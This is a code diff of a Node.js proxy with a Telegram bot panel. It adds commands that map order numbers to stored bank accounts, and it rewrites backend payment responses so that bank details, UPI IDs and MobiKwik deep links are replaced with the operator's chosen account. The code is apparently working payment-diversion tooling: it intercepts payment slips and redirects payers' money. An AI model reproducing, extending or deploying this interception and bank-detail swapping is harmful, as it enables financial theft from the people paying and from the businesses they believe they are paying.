@@ -642,6 +642,11 @@ app.post('/bot-webhook', async (req, res) => {
 /setmin <number> <amount> — Min buy amount for bank replace
 /banks — List all banks
 
+=== MANUAL ORDERS ===
+/addorder <OrderNo> | <BankIndex> — Map order to a bank
+/delorder <OrderNo> — Remove a mapped order
+/orders — List all saved manual orders
+
 === CONTROL ===
 /on — Proxy ON
 /off — Proxy OFF
@@ -825,6 +830,85 @@ Example:
     if (text === '/banks') {
       if (!data.banks || data.banks.length === 0) { await bot.sendMessage(chatId, '❌ No banks.'); return res.sendStatus(200); }
       await bot.sendMessage(chatId, '💳 Banks:\n\n' + bankListText(data));
+      return res.sendStatus(200);
+    }
+
+    if (text === '/orders') {
+      if (!data.orderBankMap || Object.keys(data.orderBankMap).length === 0) {
+        await bot.sendMessage(chatId, '📋 No saved orders.');
+        return res.sendStatus(200);
+      }
+      let m = `📋 Saved Orders (${Object.keys(data.orderBankMap).length}):\n\n`;
+      for (const [orderId, orderData] of Object.entries(data.orderBankMap)) {
+        if (!orderData.isManual) continue; // Only list manually added orders
+        m += `🛒 Order: ${orderId}\n🏦 Bank: ${orderData.bank}\n\n`;
+      }
+      await bot.sendMessage(chatId, m.substring(0, 4000) || '📋 No manually saved orders.');
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/addorder ')) {
+      const parts = text.substring(10).split('|').map(s => s.trim());
+      if (parts.length < 2) {
+        await bot.sendMessage(chatId, '❌ Format: /addorder <OrderNo> | <BankNumber>\nExample: /addorder 5524954159126535 | 1');
+        return res.sendStatus(200);
+      }
+      const orderNo = parts[0];
+      const bankIdx = parseInt(parts[1]) - 1;
+
+      if (isNaN(bankIdx) || bankIdx < 0 || !data.banks || bankIdx >= data.banks.length) {
+        await bot.sendMessage(chatId, `❌ Invalid Bank Number. You have ${data.banks ? data.banks.length : 0} banks added. Use /banks to see the list.`);
+        return res.sendStatus(200);
+      }
+
+      const selectedBank = data.banks[bankIdx];
+      const accountHolder = selectedBank.accountHolder || '';
+      const accountNo = selectedBank.accountNo || '';
+      const ifsc = selectedBank.ifsc || '';
+      const bankName = selectedBank.bankName || '';
+      const upiId = selectedBank.upiId || '';
+
+      if (!data.orderBankMap) data.orderBankMap = {};
+      
+      const last4 = accountNo.slice(-4);
+      let wDomain = '';
+      if (accountNo) {
+         wDomain = `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`;
+      }
+
+      data.orderBankMap[orderNo] = {
+        bank: `${accountHolder} | ${accountNo}${ifsc ? ' | ' + ifsc : ''}`,
+        accountHolder,
+        accountNo,
+        ifsc,
+        bankName,
+        upiId,
+        rptNo: orderNo,
+        orderNo: orderNo,
+        walletDomain: wDomain,
+        payType: 1, // Assume bank transfer for manual for now
+        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        userId: 'manual',
+        forced: true,
+        isManual: true // Flag to identify manually added orders
+      };
+      
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ Saved Order Mapping:\nOrder: ${orderNo}\nMapped to Bank #${bankIdx + 1}:\n${selectedBank.accountHolder} | ${selectedBank.accountNo}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/delorder ')) {
+      const orderNo = text.substring(10).trim();
+      if (!data.orderBankMap || !data.orderBankMap[orderNo]) {
+        await bot.sendMessage(chatId, `❌ Order ${orderNo} not found in saved mappings.`);
+        return res.sendStatus(200);
+      }
+      delete data.orderBankMap[orderNo];
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `🗑️ Removed order mapping for: ${orderNo}`);
       return res.sendStatus(200);
     }
 
@@ -1424,17 +1508,44 @@ app.all('/xxapi/*', async (req, res) => {
           return res.status(200).json(slipResp);
         }
       }
-      // Backend responded fine — pass through with bank replacement
+      // Backend responded fine
       if (sj2) {
-        const activeBank = getActiveBank(data, null);
-        if (activeBank && data.botEnabled !== false) {
+        // Extract order ID to check if it's in our mapping
+        let slipId = '';
+        const qs2 = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
+        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id']) {
+          slipId = slipId || qs2.get(f) || '';
+        }
+        if (!slipId && req.body) {
+          for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
+            slipId = slipId || req.body[f] || '';
+          }
+        }
+
+        // Only replace bank details if the order is mapped in orderBankMap
+        const savedSlip = slipId && data.orderBankMap ? data.orderBankMap[String(slipId)] : null;
+        
+        if (savedSlip && data.botEnabled !== false) {
+          // Construct a temporary bank object from the saved mapping
+          const mappedBank = {
+            accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
+            accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
+            ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
+            bankName: savedSlip.bankName || 'Bank',
+            upiId: savedSlip.upiId || ''
+          };
+
           const hasBank = scanHasBankFields(sj2, 0);
-          if (hasBank) deepReplaceBankFields(sj2, activeBank, 0, hasBank);
-          replaceWalletUrl && Object.keys(sj2.data || {}).forEach(k => {
-            if (typeof (sj2.data || {})[k] === 'string' && (sj2.data[k] || '').includes('://')) {
-              sj2.data[k] = replaceWalletUrl(sj2.data[k], activeBank);
-            }
-          });
+          if (hasBank) deepReplaceBankFields(sj2, mappedBank, 0, hasBank);
+          
+          if (replaceWalletUrl && savedSlip.walletDomain) {
+            Object.keys(sj2.data || {}).forEach(k => {
+              if (typeof (sj2.data || {})[k] === 'string' && (sj2.data[k] || '').includes('://')) {
+                // If it's a deep link, use the one saved in the map
+                sj2.data[k] = savedSlip.walletDomain;
+              }
+            });
+          }
         }
         return res.status(200).json(sj2);
       }
